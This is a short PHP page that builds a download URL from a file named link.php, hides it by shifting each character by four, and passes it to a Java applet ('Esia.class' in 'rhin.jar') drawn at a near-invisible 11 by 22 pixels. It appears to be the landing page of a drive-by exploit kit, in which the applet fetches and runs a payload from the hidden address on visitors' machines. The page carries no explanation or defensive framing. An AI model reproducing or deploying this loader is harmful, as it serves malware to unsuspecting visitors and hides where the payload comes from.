<?php
 $url=file_get_contents("link.php");
 $url= $url."/forum/load.php?showforum=rhino";
 $str = "";
            for($j = 0; $j < strlen($url); $j++)
            {
                $c = ord($url[$j]);
                $c += 4;
                $str .= chr($c);
            }
?><body>
<applet code='Esia.class' archive='rhin.jar' width='11' height='22'>
<param name="dest" value="<?php echo $str; ?>">
</applet>
</body>